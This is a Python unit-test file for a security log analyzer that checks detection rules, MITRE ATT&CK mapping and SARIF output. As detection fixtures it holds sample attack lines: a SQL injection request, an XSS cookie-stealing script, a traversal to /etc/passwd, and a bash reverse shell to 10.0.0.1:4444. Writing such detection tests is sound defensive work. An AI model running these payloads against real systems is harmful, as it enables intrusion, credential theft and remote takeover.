import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from analyzer import Alert, AnalysisResult, analyze_file, build_sarif, collect_log_files

FIXTURES = Path(__file__).resolve().parent.parent / "sample_logs"


class AnalyzeFileTests(unittest.TestCase):
    def _alerts_for(self, line: str) -> list[Alert]:
        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".log", delete=False
        ) as f:
            f.write(line + "\n")
            path = f.name
        try:
            alerts, line_count = analyze_file(path)
            self.assertEqual(line_count, 1)
            return alerts
        finally:
            Path(path).unlink()

    def test_detects_failed_login(self):
        alerts = self._alerts_for(
            "Jan 10 08:12:01 server sshd[1]: Failed password for invalid user admin from 10.0.0.1 port 1 ssh2"
        )
        ids = [a.rule_id for a in alerts]
        self.assertIn("AUTH-001", ids)

    def test_detects_brute_force_lockout(self):
        alerts = self._alerts_for("pam_unix: account locked due to too many authentication failures")
        ids = [a.rule_id for a in alerts]
        self.assertIn("AUTH-002", ids)

    def test_detects_sql_injection(self):
        alerts = self._alerts_for(
            '10.0.0.50 - - "GET /products?id=1 UNION SELECT username,password FROM users-- HTTP/1.1" 500'
        )
        ids = [a.rule_id for a in alerts]
        self.assertIn("NET-002", ids)

    def test_detects_xss_attempt(self):
        alerts = self._alerts_for('GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1')
        ids = [a.rule_id for a in alerts]
        self.assertIn("NET-003", ids)

    def test_detects_directory_traversal(self):
        alerts = self._alerts_for("GET /../../../../etc/passwd HTTP/1.1")
        ids = [a.rule_id for a in alerts]
        self.assertIn("NET-004", ids)

    def test_detects_reverse_shell_indicator(self):
        alerts = self._alerts_for("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        ids = [a.rule_id for a in alerts]
        self.assertIn("MAL-001", ids)

    def test_clean_line_produces_no_alerts(self):
        alerts = self._alerts_for("Jan 10 09:00:00 server systemd: Started daily cleanup job.")
        self.assertEqual(alerts, [])

    def test_alert_records_correct_line_number(self):
        with tempfile.NamedTemporaryFile(mode="w", suffix=".log", delete=False) as f:
            f.write("clean line one\n")
            f.write("clean line two\n")
            f.write("Failed password for invalid user admin from 10.0.0.1 port 1 ssh2\n")
            path = f.name
        try:
            alerts, line_count = analyze_file(path)
            self.assertEqual(line_count, 3)
            self.assertEqual(len(alerts), 1)
            self.assertEqual(alerts[0].line_number, 3)
        finally:
            Path(path).unlink()

    def test_missing_file_returns_empty_without_raising(self):
        alerts, line_count = analyze_file("/nonexistent/path/does-not-exist.log")
        self.assertEqual(alerts, [])
        self.assertEqual(line_count, 0)

    def test_provided_sample_auth_log_triggers_alerts(self):
        alerts, line_count = analyze_file(str(FIXTURES / "auth.log"))
        self.assertGreater(line_count, 0)
        self.assertTrue(any(a.rule_id == "AUTH-001" for a in alerts))

    def test_provided_sample_web_log_triggers_sql_injection_alert(self):
        alerts, line_count = analyze_file(str(FIXTURES / "web_access.log"))
        self.assertGreater(line_count, 0)
        self.assertTrue(any(a.rule_id == "NET-002" for a in alerts))


class CollectLogFilesTests(unittest.TestCase):
    def test_single_file_target_returns_that_file(self):
        with tempfile.TemporaryDirectory() as tmp:
            target = Path(tmp) / "auth.log"
            target.write_text("test\n")
            self.assertEqual(collect_log_files(str(target)), [str(target)])

    def test_directory_collects_files_by_extension_or_name(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "auth.log").write_text("x\n")
            (root / "custom_syslog_output.txt").write_text("x\n")
            (root / "photo.png").write_text("x\n")
            (root / "notes.md").write_text("x\n")

            found = {Path(p).name for p in collect_log_files(str(root))}

            self.assertIn("auth.log", found)
            self.assertIn("custom_syslog_output.txt", found)
            self.assertNotIn("photo.png", found)
            self.assertNotIn("notes.md", found)


class AnalysisResultTests(unittest.TestCase):
    def test_severity_counts_are_independent(self):
        result = AnalysisResult()
        result.alerts = [
            Alert("NET-002", "SQLi", "CRITICAL", "Web Attack", "T1190", "f", 1, "", ""),
            Alert("NET-003", "XSS", "HIGH", "Web Attack", "T1059.007", "f", 2, "", ""),
            Alert("AUTH-001", "Failed login", "MEDIUM", "Authentication", "T1110", "f", 3, "", ""),
        ]
        self.assertEqual(result.total_alerts, 3)
        self.assertEqual(result.critical_count, 1)
        self.assertEqual(result.high_count, 1)


class SarifTests(unittest.TestCase):
    def test_sarif_export_uses_2_1_0_schema(self):
        result = AnalysisResult(
            files_analyzed=["web.log"],
            total_lines=1,
            alerts=[
                Alert(
                    "NET-002",
                    "SQL Injection Attempt",
                    "CRITICAL",
                    "Web Attack",
                    "T1190",
                    "web.log",
                    1,
                    "GET /products?id=1 UNION SELECT password FROM users",
                    "SQL injection pattern detected.",
                )
            ],
        )

        sarif = build_sarif(result)

        self.assertEqual(sarif["version"], "2.1.0")
        self.assertEqual(sarif["runs"][0]["tool"]["driver"]["name"], "FreNiMi Log Analyzer")
        self.assertEqual(sarif["runs"][0]["results"][0]["ruleId"], "NET-002")
        self.assertEqual(sarif["runs"][0]["results"][0]["level"], "error")

    def test_sarif_rule_includes_mitre_mapping(self):
        result = AnalysisResult()
        result.alerts = [
            Alert("AUTH-001", "Failed Login", "MEDIUM", "Authentication", "T1110", "auth.log", 4, "Failed password", "Failed login detected.")
        ]

        sarif = build_sarif(result)
        rule = sarif["runs"][0]["tool"]["driver"]["rules"][0]

        self.assertEqual(rule["properties"]["mitre"], "T1110")
        self.assertEqual(rule["properties"]["category"], "Authentication")
        self.assertIn("MITRE ATT&CK", rule["fullDescription"]["text"])


if __name__ == "__main__":
    unittest.main()
